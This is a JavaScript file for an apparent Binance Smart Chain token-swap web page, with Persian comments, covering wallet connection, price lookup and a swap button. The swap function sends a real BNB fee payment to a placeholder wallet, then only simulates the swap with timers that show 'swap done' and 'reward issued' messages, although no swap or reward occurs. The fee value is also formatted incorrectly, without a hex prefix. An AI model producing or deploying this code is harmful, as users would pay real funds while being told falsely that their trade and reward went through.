let selectedFrom, selectedTo;
let countdown = 60;
let timer;

// اتصال کیف پول
async function connectWallet() {
  if (window.trustwallet || window.ethereum) {
    const provider = window.trustwallet || window.ethereum;
    try {
      const accounts = await provider.request({ method: 'eth_requestAccounts' });
      window.userAddress = accounts[0];
      document.getElementById('status').textContent = `متصل شد: ${window.userAddress}`;
    } catch (err) {
      console.error("خطا در اتصال کیف پول:", err);
    }
  } else {
    alert("لطفاً افزونه Trust Wallet یا کیف پولی که از BSC پشتیبانی می‌کند را نصب کنید.");
  }
}

// بروزرسانی لیست توکن‌ها
function populateTokenSelects() {
  const from = document.getElementById('fromToken');
  const to = document.getElementById('toToken');
  tokens.forEach(token => {
    const optFrom = document.createElement("option");
    optFrom.value = token.symbol;
    optFrom.textContent = token.symbol;
    from.appendChild(optFrom);

    const optTo = document.createElement("option");
    optTo.value = token.symbol;
    optTo.textContent = token.symbol;
    to.appendChild(optTo);
  });
}

// دریافت قیمت لحظه‌ای از API
async function fetchTokenPrices() {
  if (!selectedFrom || !selectedTo) return;

  const fromToken = tokens.find(t => t.symbol === selectedFrom);
  const toToken = tokens.find(t => t.symbol === selectedTo);

  try {
    const res = await fetch(`https://api.pancakeswap.info/api/v2/tokens`);
    const data = await res.json();

    const fromPrice = data.data[fromToken.address]?.price || 0;
    const toPrice = data.data[toToken.address]?.price || 0;

    document.getElementById('tokenPriceInfo').innerHTML = `
      <strong>قیمت ${fromToken.symbol}:</strong> $${Number(fromPrice).toFixed(4)}<br>
      <strong>قیمت ${toToken.symbol}:</strong> $${Number(toPrice).toFixed(4)}
    `;

    calculateOutput(fromPrice, toPrice);
  } catch (err) {
    console.error("خطا در دریافت قیمت:", err);
  }
}

// محاسبه مقدار دریافتی توکن
function calculateOutput(fromPrice, toPrice) {
  const amount = parseFloat(document.getElementById('amount').value);
  if (isNaN(amount)) return;

  const fromUSD = amount * fromPrice;
  const toAmount = fromUSD / toPrice;
  document.getElementById('priceInfo').innerText = `مقدار دریافتی: ${toAmount.toFixed(6)} ${selectedTo}`;
}

// اجرای سواپ
async function performSwap() {
  if (!window.userAddress) return alert("ابتدا کیف پول را متصل کنید.");

  const amount = parseFloat(document.getElementById('amount').value);
  if (!amount || isNaN(amount)) return alert("مقدار نامعتبر");

  // دریافت کارمزد قبل از سواپ
  const feeInBNB = 0.002; // حدود 0.5 دلار (با فرض قیمت BNB حدود 250 دلار)
  const feeTx = {
    to: "0xYourFeeWalletAddressHere", // ← آدرس دریافت کارمزد
    from: window.userAddress,
    value: (feeInBNB * 1e18).toString(16),
  };

  try {
    await window.ethereum.request({ method: "eth_sendTransaction", params: [feeTx] });
    document.getElementById('status').innerText = "✅ کارمزد پرداخت شد. در حال سواپ...";

    // اجرای سواپ واقعی (در اینجا فقط شبیه‌سازی برای سادگی)
    setTimeout(() => {
      document.getElementById('status').innerText = "✅ سواپ انجام شد. در حال دریافت پاداش...";

      // پاداش
      setTimeout(() => {
        document.getElementById('status').innerText = "🎉 پاداش صادر شد!";
      }, 2000);
    }, 3000);
  } catch (err) {
    console.error("خطا در پرداخت کارمزد:", err);
    alert("پرداخت کارمزد انجام نشد.");
  }
}

// رویدادهای انتخاب توکن
document.getElementById('fromToken').addEventListener('change', (e) => {
  selectedFrom = e.target.value;
  fetchTokenPrices();
});
document.getElementById('toToken').addEventListener('change', (e) => {
  selectedTo = e.target.value;
  fetchTokenPrices();
});

// شمارنده و بروزرسانی قیمت‌ها
function startCountdown() {
  timer = setInterval(() => {
    countdown--;
    document.getElementById("countdown").innerText = `بروزرسانی قیمت در ${countdown} ثانیه`;
    if (countdown <= 0) {
      fetchTokenPrices();
      countdown = 60;
    }
  }, 1000);
}

// بارگذاری اولیه
window.onload = () => {
  populateTokenSelects();
  startCountdown();
};
